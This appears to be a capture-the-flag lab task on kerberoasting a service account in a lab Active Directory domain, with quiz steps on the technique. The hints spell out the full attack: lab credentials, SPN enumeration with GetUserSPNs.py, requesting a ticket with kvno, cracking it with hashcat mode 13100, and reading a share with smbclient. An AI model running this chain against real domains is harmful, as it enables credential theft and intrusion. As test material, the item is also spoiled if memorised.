objectives.title: Read the flag
objectives.prompt: From the t.okonkwo foothold, kerberoast svc-mssql-tms: request its Kerberos service ticket, crack it offline to recover svc-mssql-tms's password, then read flag.txt from the //dc/manifests share that only svc-mssql-tms may open.
hints: t.okonkwo is a normal domain user (t.okonkwo / Dispatch!2024). Point your resolver and /etc/krb5.conf at the DC, then enumerate SPNs: GetUserSPNs.py -dc-ip <dc> MERIDIAN.LAB/t.okonkwo:'Dispatch!2024'.
Request the service ticket with the native MIT Kerberos tools (kinit t.okonkwo, then kvno MSSQLSvc/dc.meridian.lab:1433) and pull the $krb5tgs$23$ hash out of your credential cache.

The ticket is RC4 (etype 23): crack it with hashcat -m 13100 against a wordlist. The password is a weak company+year word. Then: smbclient //dc/manifests -U 'MERIDIAN\svc-mssql-tms%<cracked>' -c 'get flag.txt'.

steps.title: Name the technique
steps.prompt: What is the name of the attack that abuses a service account's SPN to recover its password offline?

steps.title: Find the roastable account
steps.prompt: Which account carries a Service Principal Name and is therefore roastable? (username)

steps.title: Name the attribute
steps.prompt: Which account attribute makes it roastable? (three words, or its abbreviation)

steps.title: Name the ticket encryption
steps.prompt: Which encryption type is the service ticket, that makes it fast to crack? (name or Kerberos etype number)

steps.title: Pick the crack mode
steps.prompt: Which hashcat mode cracks an RC4 TGS-REP ($krb5tgs$23$) hash?
